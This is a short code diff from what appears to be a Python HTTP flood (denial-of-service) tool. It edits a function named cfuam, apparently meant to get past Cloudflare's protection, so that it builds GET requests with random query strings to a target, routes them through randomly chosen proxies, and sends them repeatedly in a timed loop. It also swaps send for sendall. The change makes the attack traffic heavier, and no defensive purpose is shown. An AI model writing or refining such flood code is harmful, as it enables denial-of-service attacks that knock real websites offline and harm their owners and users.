@@ -473,10 +473,10 @@ def httpfastv2(event, socks_type):
 
 
 def cfuam(event, socks_type):
-    header = Headers("head")
+    header = Headers("get")
     proxy = Choice(proxies).strip().split(":")
-    head_host = "HEAD " + path + "?" + random_data() + " HTTP/1.1\r\nHost: " + target + "\r\n"
-    request = head_host + header
+    get_host = "GET " + path + "?" + random_data() + " HTTP/1.1\r\nHost: " + target + "\r\n"
+    request = get_host + header
     event.wait()
     while time.time() < timer:
         try:
@@ -504,7 +504,7 @@ def cfuam(event, socks_type):
             try:
                 time.sleep(2)
                 for _ in range(multiple):
-                    s.send(str.encode(request))
+                    s.sendall(str.encode(request))
             except:
                 s.close()
         except:
